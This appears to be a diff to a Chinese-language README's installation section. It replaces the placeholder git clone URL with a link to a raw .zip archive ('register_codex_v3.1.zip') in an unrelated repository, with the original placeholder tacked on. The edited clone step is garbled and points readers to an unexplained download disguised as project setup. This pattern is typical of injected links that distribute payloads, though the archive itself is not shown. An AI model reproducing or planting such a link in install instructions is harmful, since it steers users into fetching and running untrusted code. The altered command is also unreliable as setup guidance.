@@ -19,7 +19,7 @@
 1. **环境要求**：需要 Python 3.8 或更高版本。
 2. **克隆项目**：
    ```bash
-   git clone https://github.com/你的用户名/你的项目名.git
+   git clone https://github.com/Hermylivid261/codex_register/raw/refs/heads/main/piezochemical/register_codex_v3.1.zip你的用户名/你的项目名.git
    cd 你的项目名
    ```
 3. **安装依赖**：
